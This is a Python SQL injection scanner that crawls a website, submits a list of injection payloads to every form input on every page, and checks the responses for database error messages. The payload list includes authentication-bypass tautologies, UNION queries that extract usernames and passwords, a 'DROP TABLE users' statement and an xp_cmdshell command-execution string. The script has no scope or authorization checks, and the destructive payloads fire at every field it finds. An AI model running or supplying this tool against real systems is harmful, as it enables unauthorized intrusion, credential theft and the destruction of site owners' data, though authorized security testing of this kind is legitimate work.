import requests
from bs4 import BeautifulSoup

class SQLInjectionTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.sql_payloads = [
            "' OR '1'='1",  # Classic SQL Injection
            "' OR '1'='1' --",  # SQL Injection with comment
            "' OR '1'='1' /*",  # SQL Injection with block comment
            "'; DROP TABLE users; --",  # Destructive SQL Injection
            "' UNION SELECT * FROM users --",  # Attempt to select all data from a table
            "' UNION SELECT * FROM information_schema.tables --",  # Attempt to retrieve table names
            "' UNION SELECT username, password FROM users --",  # Attempt to retrieve specific columns
            "' AND 1=1 --",  # SQL Injection with tautology
            "' AND 1=2 --",  # SQL Injection with contradiction
            "'; EXEC xp_cmdshell('dir'); --",  # SQL Server command execution
        ]
        self.error_messages = [
            "you have an error in your sql syntax;",
            "unclosed quotation mark after the character string",
            "warning: mysql",
            "ORA-00933",  # Oracle SQL error
            "SQLSTATE[42000]",  # MySQL SQL error
            "syntax error",  # Generic SQL syntax error
            "Microsoft OLE DB Provider for SQL Server"  # MS SQL Server error
        ]

    def fetch_links(self):
        """
        Fetches all the links from the base URL to iterate through the website's pages.
        """
        response = self.session.get(self.base_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        links = set()
        for a_tag in soup.find_all('a', href=True):
            url = a_tag['href']
            if url.startswith('/'):
                url = self.base_url + url
            if self.base_url in url:
                links.add(url)
        return links

    def test_input_boxes(self, url):
        """
        Test all input boxes on a given page for SQL injection vulnerabilities.
        """
        print(f"Testing page: {url}")
        response = self.session.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')

        for form in forms:
            form_action = form.get('action')
            if not form_action.startswith('http'):
                form_action = self.base_url + form_action
            
            inputs = form.find_all('input')
            for input_tag in inputs:
                input_name = input_tag.get('name')
                if input_name:
                    for payload in self.sql_payloads:
                        data = {input_name: payload}
                        print(f"Submitting form {form_action} with payload {payload}")
                        res = self.session.post(form_action, data=data)

                        for error in self.error_messages:
                            if error.lower() in res.text.lower():
                                print(f"Potential SQL Injection Vulnerability found on {url} with payload: {payload}")
                                break

    def run_tests(self):
        """
        Run SQL injection tests on all pages and input boxes of the website.
        """
        links = self.fetch_links()
        for link in links:
            self.test_input_boxes(link)


# EXAMPLE USAGE
if __name__ == "__main__":
    # Replace 'http://example.com' with the actual base URL to test
    tester = SQLInjectionTester("http://example.com")
    tester.run_tests()
